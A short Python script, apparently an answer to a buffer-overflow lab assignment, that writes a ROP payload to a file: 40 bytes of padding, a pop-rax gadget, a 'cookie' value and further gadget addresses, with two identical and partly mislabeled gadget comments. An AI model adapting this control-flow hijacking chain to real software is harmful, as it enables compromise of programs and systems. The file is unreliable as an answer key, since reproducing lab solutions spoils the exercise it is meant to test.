#!/usr/bin/env python

from struct import *

buf = ""
buf += "A"*40                             # junk
buf += pack("<Q", 0x0000000000401b4a)       # pop rax; ret
buf += pack("<Q", 0x5ff762f9)               # cookie
buf += pack("<Q", 0x0000000000401b57)           # movl rdi, rax; ret
buf += pack("<Q", 0x000000000040198e)           # movl rdi, rax;

f = open("4exploitstring.txt", "w")
f.write(buf)

